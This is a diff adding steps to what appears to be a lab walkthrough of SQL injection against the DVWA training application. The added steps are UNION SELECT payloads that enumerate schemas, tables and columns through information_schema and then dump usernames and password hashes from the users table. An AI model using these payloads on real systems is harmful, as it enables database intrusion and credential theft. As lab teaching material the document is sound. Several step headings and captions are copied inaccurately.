@@ -53,3 +53,47 @@ SHOW DATABASES
 * Functions to use : `database()` and `user()` 
 * Type the following command to print database used:<br>
 `2'UNION SELECT database(), user() # `
+<img src="./images/05.database_and_users.png"></img>
+
+### Step 2: Using SCHEMATA to extract database name
+* Type the following SQL Injection command to extract database name:
+```
+  2' UNION SELECT schema_name, 2 FROM information_schema.schemata #'
+```
+* Output is as follows :<br><br>
+<img src="./images/11.edited_schemata.png"></img>
+
+### Step 3: Using SCHEMATA to extract table name
+* Type the following SQL Injection command to extract database name:
+```
+  2' UNION SELECT table_name, 2 FROM information_schema.tables WHERE table_schema = 'dvwa' #'
+```
+
+* Output is as follows :<br><br>
+<img src="./images/12.edited_table_name.png"></img>
+
+### Step 3: Using SCHEMATA to extract column names
+* Type the following SQL Injection command to extract database name:
+```
+  2' UNION SELECT column_name, column_type FROM information_schema.columns WHERE table_schema = 'dvwa' AND table_name = 'users' #'
+```
+
+* Output is as follows :<br><br>
+<img src="./images/13.edited_col_name.png"></img>
+
+### Step 3: Using SCHEMATA to extract username and encrypted passwords
+* Type the following SQL Injection command to extract database name:
+```
+  2' UNION SELECT CONCAT(user_id, '-', first_name,' ', last_name), CONCAT(user, ':', password) FROM dvwa.users #'
+```
+
+* Output is as follows :<br><br>
+<img src="./images/13.edited_pass.png"></img>
+
+
+
+
+
+
+
+
